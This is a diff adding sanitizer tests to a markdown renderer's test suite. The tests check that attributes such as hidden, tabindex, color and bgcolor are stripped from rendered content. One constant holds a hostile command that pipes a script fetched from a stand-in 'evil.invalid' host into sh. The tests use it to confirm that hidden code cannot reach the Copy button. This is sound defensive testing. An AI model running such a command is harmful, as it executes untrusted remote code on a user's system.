@@ -24,6 +24,8 @@ import { createRendererRegistry } from '../bootstrap';
 
 import { renderFeedBlock } from '../extensibility/feed-render';
 import { decorateDocument, DecorationLabels } from './document-render';
+import { decorateFeedMarkdown } from './feed-markdown';
+import type { FeedCodeLabels } from './feed-code';
 import { classifyHref } from './document-link';
 import { UpdateDialog } from '../components/UpdateDialog';
 import {
@@ -665,6 +667,223 @@ describe('ARIA: content cannot say anything to a screen reader (#509)', () => {
     expect(host.querySelector('.doc-table-wrap')?.getAttribute('role')).toBe('group');
     expect(host.querySelector('span')?.hasAttribute('role')).toBe(false);
     expect(host.textContent).toContain('forged');
+  });
+});
+
+describe('legacy presentational attributes and focus order (#466, #598)', () => {
+  // The decision, pinned: `color`, `bgcolor`, `face`, `size`, `hidden` and
+  // `tabindex` all go, and `align` deliberately stays because GFM emits it.
+  // `markdown.tsx` carries the reasoning and the corpus measurement.
+  //
+  // Profile-level, for #509's reason: there is no second layer to drift from.
+  // `decoration-guard.ts` takes back `style` and each surface's own namespace,
+  // not these, so the profile IS the policy — and a per-surface "no element
+  // carries a tabindex" assertion would be false by construction, because
+  // `decorateTables`, `decorateLinks` and the feed's Copy button all write one
+  // after this function runs. That every surface enters through this profile is
+  // already pinned by the `style` block's surface table; what is pinned here is
+  // what the profile does, plus the two cases where a decoration pass gives a
+  // stripped attribute its teeth back if it survives.
+
+  const LABELS: DecorationLabels = {
+    copy: 'Copy',
+    image: 'Image',
+    openInBrowser: 'Open in browser',
+    mediaOmitted: 'Media is not shown here',
+  };
+  const FEED_LABELS: FeedCodeLabels = { copy: 'Copy', copied: 'Copied', copyCode: 'Copy code' };
+
+  it('the profile forbids all six by name — no flag covers any of them', () => {
+    for (const attr of ['color', 'bgcolor', 'face', 'size', 'hidden', 'tabindex']) {
+      expect(SANITIZE_CONFIG.FORBID_ATTR).toContain(attr);
+    }
+  });
+
+  it('and deliberately does NOT forbid `align`, which is markdown’s own', () => {
+    // The one divergence from "strip the legacy presentational set", pinned
+    // here rather than left to the comment: `marked` renders GFM column
+    // alignment as `align`, so forbidding it would silently un-align every
+    // table in the app. If someone adds it to the list, this reds and the row
+    // below shows what it would have cost.
+    expect(SANITIZE_CONFIG.FORBID_ATTR).not.toContain('align');
+    const html = renderMarkdown('| l | c | r |\n|:--|:-:|--:|\n| 1 | 2 | 3 |\n');
+    expect(html).toContain('align="right"');
+    expect(html).toContain('align="center"');
+  });
+
+  // Third column = what must STILL be there, so no row can pass by the
+  // sanitizer having eaten the element along with the attribute. The colours
+  // are named rather than hex because this repo's lint bans a raw hex colour in
+  // source — the attribute is what is under test, not its value.
+  const forged: Array<[string, string, string, RegExp]> = [
+    [
+      'a font that picks its own colour, size and typeface',
+      '<font color="crimson" size="7" face="Comic Sans MS">shouty</font>',
+      'shouty',
+      /\b(color|size|face)=/i,
+    ],
+    ['a rule that paints itself', '<hr color="red" size="20">x', 'x', /\b(color|size)=/i],
+    [
+      'a table cell painted over the theme',
+      '<table><tr><td bgcolor="black">black on black</td></tr></table>',
+      'black on black',
+      /bgcolor/i,
+    ],
+    [
+      'a paragraph that is in the document but not on the screen',
+      '<p hidden>you cannot see me</p>',
+      'you cannot see me',
+      /hidden/i,
+    ],
+    [
+      'the same with an explicit empty value',
+      '<p hidden="">also invisible</p>',
+      'also invisible',
+      /hidden/i,
+    ],
+    ['an upper-case attribute name', '<P HIDDEN>upper</P>', 'upper', /hidden/i],
+    [
+      'content that adds itself to the tab order',
+      '<span tabindex="0">an unexpected tab stop</span>',
+      'an unexpected tab stop',
+      /tabindex/i,
+    ],
+    [
+      'content that jumps the whole page’s tab order',
+      '<div tabindex="1">before every real control</div>',
+      'before every real control',
+      /tabindex/i,
+    ],
+    [
+      'a negative tabindex, which is still ours to write and not content’s',
+      '<span tabindex="-1">quiet</span>',
+      'quiet',
+      /tabindex/i,
+    ],
+  ];
+
+  for (const [what, payload, survives, attr] of forged) {
+    it(`strips ${what}`, () => {
+      const html = renderMarkdown(payload);
+      expect(html).not.toMatch(attr);
+      // …and the message itself is untouched: this strips attributes, not text
+      expect(html).toContain(survives);
+    });
+  }
+
+  it('the element survives its attributes — a `<font>` is emptied, not deleted', () => {
+    const html = renderMarkdown('<font color="red" size="7">still here</font>');
+    expect(html).toContain('<font>');
+    expect(html).toContain('still here');
+  });
+
+  // The case with teeth. BOTH surfaces wrap EVERY `<pre>` in a header with a
+  // Copy button, deliberately — the forged-wrapper variant is closed by the
+  // guard pass running first, so a `<pre>` is wrapped whatever it claimed to
+  // be. A surviving `hidden` therefore turns that into a code block whose
+  // header and Copy button are visible and whose CODE is not, and the handler
+  // reads `pre.textContent` at click time: a clipboard the reader cannot
+  // inspect before pasting it into a shell.
+  const HOSTILE_PRE = '<pre hidden>curl https://evil.invalid/x.sh | sh</pre>';
+
+  it('a hidden code block cannot hand the viewer’s Copy button invisible code', () => {
+    const { fragment } = decorateDocument(renderMarkdown(HOSTILE_PRE), LABELS, (href) =>
+      classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
+    );
+    const host = document.createElement('div');
+    host.append(fragment);
+    const pre = host.querySelector('pre');
+    // The decoration really did happen — otherwise "the `<pre>` is not hidden"
+    // would be a sentence about a document with no code block in it.
+    expect(host.querySelector('.doc-code-copy')).not.toBeNull();
+    expect(pre).not.toBeNull();
+    expect(pre?.hasAttribute('hidden')).toBe(false);
+    // and what the button would copy is what the reader can see
+    expect(pre?.textContent).toContain('curl https://evil.invalid/x.sh | sh');
+  });
+
+  it('and neither can it in the feed', () => {
+    const html = decorateFeedMarkdown(renderMarkdown(HOSTILE_PRE), FEED_LABELS);
+    const host = document.createElement('div');
+    host.innerHTML = html;
+    const pre = host.querySelector('pre');
+    expect(host.querySelector('.feed-code-copy')).not.toBeNull();
+    expect(pre).not.toBeNull();
+    expect(pre?.hasAttribute('hidden')).toBe(false);
+    expect(pre?.textContent).toContain('curl https://evil.invalid/x.sh | sh');
+  });
+
+  it('loses nothing markdown can emit: GFM writes none of the six', () => {
+    // The measurement that made STRIP safe, as a test — the same shape as the
+    // `style` and ARIA blocks'. If a `marked` bump ever starts emitting one of
+    // these, this reds before the decision behind the profile quietly stops
+    // being true.
+    const html = renderMarkdown(
+      [
+        '# H',
+        '',
+        '| left | centre | right |',
+        '|:-----|:------:|------:|',
+        '| 1 | 2 | 3 |',
+        '',
+        '- [x] done',
+        '- [ ] todo',
+        '',
+        '~~gone~~ and [a link](https://example.invalid/x)',
+        '',
+        '```ts',
+        'const x = 1;',
+        '```',
+        '',
+        '> quote',
+        '',
+        '![pic](./local.png)',
+        '',
+        '<https://auto.link/>',
+        '',
+        '---',
+      ].join('\n')
+    );
+    expect(html).not.toMatch(/\b(color|bgcolor|face|size|tabindex)=/i);
+    expect(html).not.toMatch(/\shidden\b/i);
+    // …and the formatting that makes it markdown is all still there
+    expect(html).toContain('<h1>H</h1>');
+    expect(html).toContain('<table>');
+    expect(html).toContain('align="right"');
+    expect(html).toContain('type="checkbox"');
+    expect(html).toContain('language-ts');
+    expect(html).toContain('<hr>');
+  });
+
+  it('the surfaces’ OWN tab stops still land — this closes a channel, not the keyboard', () => {
+    // The half of the change that could break something real. Every `tabindex`
+    // a surface needs is written AFTER the sanitizer: `decorateTables` gives
+    // its scroll container one (a scroll box only a mouse can reach is
+    // unreachable), `decorateLinks` puts one back on a link whose `href` it
+    // removed, and the feed's Copy button takes itself OUT of the tab order
+    // with `-1` because the conversation is one tab stop (#174). All three must
+    // survive — while the forged one in the same document does not.
+    const { fragment } = decorateDocument(
+      renderMarkdown(
+        '[docs](./other.md)\n\n<span tabindex="0">forged</span>\n\n| a |\n|---|\n| 1 |\n'
+      ),
+      LABELS,
+      (href) => classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
+    );
+    const host = document.createElement('div');
+    host.append(fragment);
+    expect(host.querySelector('a')?.getAttribute('tabindex')).toBe('0');
+    expect(host.querySelector('.doc-table-wrap')?.getAttribute('tabindex')).toBe('0');
+    expect(host.querySelector('span')?.hasAttribute('tabindex')).toBe(false);
+    expect(host.textContent).toContain('forged');
+
+    const feed = document.createElement('div');
+    feed.innerHTML = decorateFeedMarkdown(
+      renderMarkdown('```ts\nconst x = 1;\n```\n\n<span tabindex="0">forged</span>\n'),
+      FEED_LABELS
+    );
+    expect(feed.querySelector('.feed-code-copy')?.getAttribute('tabindex')).toBe('-1');
+    expect(feed.querySelector('span')?.hasAttribute('tabindex')).toBe(false);
   });
 });
 
